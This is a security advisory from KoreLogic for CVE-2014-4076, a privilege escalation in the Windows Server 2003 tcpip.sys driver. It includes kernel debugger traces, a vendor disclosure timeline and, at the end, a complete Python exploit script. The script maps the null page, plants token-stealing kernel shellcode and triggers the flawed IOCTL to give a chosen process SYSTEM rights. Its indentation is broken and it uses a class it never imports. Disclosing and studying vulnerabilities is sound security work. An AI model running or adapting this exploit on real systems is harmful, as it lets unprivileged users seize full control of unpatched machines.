"""
KL-001-2015-001 : Microsoft Windows Server 2003 SP2 Arbitrary Write Privilege Escalation

Title: Microsoft Windows Server 2003 SP2 Arbitrary Write Privilege Escalation
Advisory ID: KL-001-2015-001
Publication Date: 2015.01.28
Publication URL: https://www.korelogic.com/Resources/Advisories/KL-001-2015-001.txt

1. Vulnerability Details

     Affected Vendor: Microsoft
     Affected Product: TCP/IP Protocol Driver
     Affected Version: 5.2.3790.4573
     Platform: Microsoft Windows Server 2003 Service Pack 2
     Architecture: x86, x64, Itanium
     Impact: Privilege Escalation
     Attack vector: IOCTL
     CVE-ID: CVE-2014-4076

2. Vulnerability Description

     The tcpip.sys driver fails to sufficiently validate memory
     objects used during the processing of a user-provided IOCTL.

3. Technical Description

     By crafting an input buffer that will be passed to the Tcp
     device through the NtDeviceIoControlFile() function, it
     is possible to trigger a vulnerability that would allow an
     attacker to elevate privileges.

     This vulnerability was discovered while fuzzing the tcpip.sys
     driver. A collection of IOCTLs that could be targeted was
     obtained and subsequently fuzzed. During this process, one of
     the crashes obtained originated from the IOCTL 0x00120028.
     This was performed on an x86 installation of Windows Server
     2003, Service Pack 2.

     ErrCode = 00000000
     eax=00000000 ebx=859ef888 ecx=00000008 edx=00000100 esi=00000000 edi=80a58270
     eip=f67ebbbd esp=f620a9c8 ebp=f620a9dc iopl=0         nv up ei pl zr na pe nc
     cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010246
     tcpip!SetAddrOptions+0x1d:
     f67ebbbd 8b5e28          mov     ebx,dword ptr [esi+28h] ds:0023:00000028=????????

     A second chance exception has occurred during a mov
     instruction. This instruction is attempting to copy a pointer
     value from an un-allocated address space. Since no pointer
     can be found, an exception is generated.

     Let's begin by reviewing the call stack:

     kd> kv
     *** Stack trace for last set context - .thread/.cxr resets it
     ChildEBP RetAddr  Args to Child              
     f620a9dc f67e416b f620aa34 00000022 00000004 tcpip!SetAddrOptions+0x1d (FPO: [Non-Fpo])
     f620aa10 f67e40de f620aa34 859ef888 859ef8a0 tcpip!TdiSetInformationEx+0x539 (FPO: [Non-Fpo])
     f620aa44 f67e3b24 85a733d0 85a73440 85a73440 tcpip!TCPSetInformationEx+0x8c (FPO: [Non-Fpo])
     f620aa60 f67e3b51 85a733d0 85a73440 85a733d0 tcpip!TCPDispatchDeviceControl+0x149 (FPO: [Non-Fpo])
     f620aa98 8081d7d3 85c4b410 85a733d0 85e82390 tcpip!TCPDispatch+0xf9 (FPO: [Non-Fpo])
     f620aaac 808ef85d 85a73440 85e82390 85a733d0 nt!IofCallDriver+0x45 (FPO: [Non-Fpo])
     f620aac0 808f05ff 85c4b410 85a733d0 85e82390 nt!IopSynchronousServiceTail+0x10b (FPO: [Non-Fpo])
     f620ab5c 808e912e 000006f4 00000000 00000000 nt!IopXxxControlFile+0x5e5 (FPO: [Non-Fpo])
     f620ab90 f55c10fa 000006f4 00000000 00000000 nt!NtDeviceIoControlFile+0x2a (FPO: [Non-Fpo])

     The nt!NtDeviceIoControlFile() function was called, creating
     a chain of subsequent function calls that eventually led to
     the tcpip!SetAddrOptions() function being called.

     By de-constructing the call to nt!NtDeviceIoControlFile() we
     can derive all required information to re-create this exception.

     0a b940dd34 80885614 nt!NtDeviceIoControlFile+0x2a
     eax=00000000 ebx=8c785070 ecx=00000000 edx=00000000 esi=00000000 edi=00000000
     eip=808e912e esp=b940dd08 ebp=b940dd34 iopl=0         nv up ei pl zr na pe nc
     cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010246
     nt!NtDeviceIoControlFile+0x2a:
     808e912e 5d              pop     ebp
     kd> db [ebp+2C] L?0x4
     b940dd60  00 00 00 00                                      ....
     kd> db [ebp+28] L?0x4
     b940dd5c  00 00 00 00                                      ....
     kd> db [ebp+24] L?0x4
     b940dd58  20 00 00 00                                       ...
     kd> db [ebp+20] L?0x4
     b940dd54  00 11 00 00                                      ....
     kd> db [ebp+1c] L?0x4
     b940dd50  28 00 12 00                                      (...
     kd> db [ebp+18] L?0x4
     b940dd4c  58 4f bd 00                                      XO..
     kd> db [ebp+14] L?0x4
     b940dd48  00 00 00 00                                      ....
     kd> db [ebp+10] L?0x4
     b940dd44  00 00 00 00                                      ....
     kd> db [ebp+0c] L?0x4
     b940dd40  00 00 00 00                                      ....
     kd> db [ebp+8] L?0x4
     b940dd3c  b8 06 00 00                                      ....

     The inputBuffer for this call references memory at 0x1000 with
     a length of 0x20.

     kd> db 0x1100 L?0x20
     00001100  00 04 00 00 00 00 00 00-00 02 00 00 00 02 00 00  ................
     00001110  22 00 00 00 04 00 00 00-00 00 01 00 00 00 00 00  "...............

     After review of the tcpip.sys driver, some memory trickery
     was created to control the code flow until the instruction
     pointer could be controlled in a way that would be beneficial
     to an attacker.

     kd> db 0x28 L?0x11
     00000028  87 ff ff 38 00 00 00 00-00 00 00 00 00 00 00 00  ...8............
     00000038  01 

     eax=00000000 ebx=80a58290 ecx=00000000 edx=00000000 esi=00000000 edi=00000000
     eip=0000002a esp=b940db3c ebp=b940db60 iopl=0         nv up ei pl zr na pe nc
     cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010246
     0000002a ff              ???

     Since the instruction pointer now contains 0x0000002a,
     exploitation becomes trivial. Merely allocating the desired
     payload for execution at this memory address will allow for
     unprivileged users to run their payload within a privileged
     process.

4. Mitigation and Remediation Recommendation

     The vendor has issued a patch for this
     vulnerability, the details of which are presented
     in the vendor's public acknowledgment MS14-070
     (https://technet.microsoft.com/library/security/MS14-070).

5. Credit

     This vulnerability was discovered by Matt Bergin of KoreLogic
     Security, Inc.

6. Disclosure Timeline

     2014.04.28 - Initial contact; sent Microsoft report and PoC.
     2014.04.28 - Microsoft requests PoC.
     2014.04.29 - KoreLogic resends PoC from the initial contact
                  email.
     2014.04.29 - Microsoft acknowledges receipt of vulnerability
                  report.
     2014.04.29 - Microsoft opens case 19010 (MSRC 0050929) to
                  investigate the vulnerability.
     2014.04.30 - Microsoft informs KoreLogic that the case is
                  actively being investigated.
     2014.05.30 - Microsoft informs KoreLogic that the case is
                  actively being investigated.
     2014.06.11 - KoreLogic informs Microsoft that 30 business days
                  have passed since vendor acknowledgment of the
                  initial report. KoreLogic requests CVE number for
                  the vulnerability, if there is one. KoreLogic
                  also requests vendor's public identifier for the
                  vulnerability along with the expected disclosure
                  date.
     2014.06.24 - KoreLogic informs Microsoft that no response was
                  received following the 06.11.14 email. KoreLogic
                  requests CVE number for the vulnerability, if
                  there is one. KoreLogic also requests vendor's
                  public identifier for the vulnerability along with
                  the expected disclosure date.
     2014.06.24 - Microsoft replies to KoreLogic that they have
                  reproduced the vulnerability and are determining
                  how to proceed with the supplied information.
                  They are not able to provide a CVE or an expected
                  disclosure date.
     2014.07.02 - 45 business days have elapsed since Microsoft
                  acknowledged receipt of the vulnerability report
                  and PoC.
     2014.07.17 - KoreLogic requests CVE number for the
                  vulnerability. KoreLogic also requests vendor's
                  public identifier for the vulnerability along with
                  the expected disclosure date.
     2014.08.18 - Microsoft notifies KoreLogic that they have a CVE
                  but are not willing to share it with KoreLogic at
                  this time.
     2014.09.08 - KoreLogic requests CVE number for the
                  vulnerability. KoreLogic also requests vendor's
                  public identifier for the vulnerability along with
                  the expected disclosure date.
     2014.09.11 - Microsoft responds saying that the vulnerability
                  is expected to be disclosed in "a Fall release"
                  and that "it is currently looking good for
                  October." Does not provide CVE.
     2014.09.24 - Microsoft informs KoreLogic that there was a
                  packaging issue and that the patch will be pushed
                  to November.
     2014.11.03 - Microsoft confirms the patch will ship in November.
     2014.11.11 - Vulnerability publicly disclosed by Microsoft as
                  issue MS14-070 with CVE-2014-4076.
     2015.01.28 - KoreLogic releases advisory.

7. Exploit
"""

     #!/usr/bin/python2
     #
     # KL-001-2015-001 / MS14-070 / CVE-2014-4076
     # Microsoft Windows Server 2003 x86 Tcpip.sys Privilege Escalation
     # Matt Bergin @ KoreLogic / Level @ Smash the Stack
     # shout out to bla
     #

     from optparse import OptionParser
     from subprocess import Popen
     from os.path import exists
     from struct import pack
     from time import sleep
     from ctypes import *
     from sys import exit

     CreateFileA,NtAllocateVirtualMemory,WriteProcessMemory = 
windll.kernel32.CreateFileA,windll.ntdll.NtAllocateVirtualMemory,windll.kernel32.WriteProcessMemory
     DeviceIoControlFile,CloseHandle = windll.ntdll.ZwDeviceIoControlFile,windll.kernel32.CloseHandle
     INVALID_HANDLE_VALUE,FILE_SHARE_READ,FILE_SHARE_WRITE,OPEN_EXISTING,NULL = -1,2,1,3,0

     def spawn_process(path):
         process = Popen([path],shell=True)
         pid = process.pid
         return

     def main():
         print "CVE-2014-4076 x86 exploit, Level\n"
         global pid, process
         parser = OptionParser()
         parser.add_option("--path",dest="path",help="path of process to start and elevate")
         parser.add_option("--pid",dest="pid",help="pid of running process to elevate")
         o,a = parser.parse_args()
         if (o.path == None and o.pid == None):
             print "[!] no path or pid set"
             exit(1)
         else:
             if (o.path != None):
           if (exists(o.path) != True):
         print "[!] path does not exist"
         exit(1)
           else:
                   Thread(target=spawn_process,args=(o.path),name='attacker-cmd').start()
             if (o.pid != None):
                 try:
                     pid = int(o.pid)
                 except:
                     print "[!] could not convert PID to an interger."
                     exit(1)
         while True:
                 if ("pid" not in globals()):
                     sleep(1)
                 else:
                     print "[+] caught attacker cmd at %s, elevating now" % (pid)
                     break
         buf = 
"\x00\x04\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x02\x00\x00\x22\x00\x00\x00\x04\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00"
         sc = 
"\x60\x64\xA1\x24\x01\x00\x00\x8B\x40\x38\x50\xBB\x04\x00\x00\x00\x8B\x80\x98\x00\x00\x00\x2D\x98\x00\x00\x00\x39\x98\x94\x00\x00\x00\x75\xED\x8B\xB8\xD8\x00\x00\x00\x83\xE7\xF8\x58\xBB\x41\x41\x41\x41\x8B\x80\x98\x00\x00\x00\x2D\x98\x00\x00\x00\x39\x98\x94\x00\x00\x00\x75\xED\x89\xB8\xD8\x00\x00\x00\x61\xBA\x11\x11\x11\x11\xB9\x22\x22\x22\x22\xB8\x3B\x00\x00\x00\x8E\xE0\x0F\x35\x00"
         sc = sc.replace("\x41\x41\x41\x41",pack('<L',pid))
         sc = sc.replace("\x11\x11\x11\x11","\x39\xff\xa2\xba")
         sc = sc.replace("\x22\x22\x22\x22","\x00\x00\x00\x00")           
         handle = CreateFileA("\\\\.\\Tcp",FILE_SHARE_WRITE|FILE_SHARE_READ,0,None,OPEN_EXISTING,0,None)
         if (handle == -1):
             print "[!] could not open handle into the Tcp device"
             exit(1)
         print "[+] allocating memory"              
         ret_one = NtAllocateVirtualMemory(-1,byref(c_int(0x1000)),0x0,byref(c_int(0x4000)),0x1000|0x2000,0x40)
         if (ret_one != 0):
             print "[!] could not allocate memory..."
             exit(1)
         print "[+] writing relevant memory..."
         ret_two = WriteProcessMemory(-1, 0x28, "\x87\xff\xff\x38", 4, byref(c_int(0)))
         ret_three = WriteProcessMemory(-1, 0x38, "\x00"*2, 2, byref(c_int(0)))
         ret_four = WriteProcessMemory(-1, 0x1100, buf, len(buf), byref(c_int(0)))
         ret_five = WriteProcessMemory(-1, 0x2b, "\x00"*2, 2, byref(c_int(0)))
         ret_six = WriteProcessMemory(-1, 0x2000, sc, len(sc), byref(c_int(0)))
         print "[+] attack setup done, crane kick!"
         DeviceIoControlFile(handle,NULL,NULL,NULL,byref(c_ulong(8)),0x00120028,0x1100,len(buf),0x0,0x0)
         CloseHandle(handle)
         exit(0)

     if __name__=="__main__":
         main()

"""
The contents of this advisory are copyright(c) 2015
KoreLogic, Inc. and are licensed under a Creative Commons
Attribution Share-Alike 4.0 (United States) License:
http://creativecommons.org/licenses/by-sa/4.0/

KoreLogic, Inc. is a founder-owned and operated company with a
proven track record of providing security services to entities
ranging from Fortune 500 to small and mid-sized companies. We
are a highly skilled team of senior security consultants doing
by-hand security assessments for the most important networks in
the U.S. and around the world. We are also developers of various
tools and resources aimed at helping the security community.
https://www.korelogic.com/about-korelogic.html

Our public vulnerability disclosure policy is available at:
https://www.korelogic.com/KoreLogic-Public-Vulnerability-Disclosure-Policy.v1.0.txt
"""
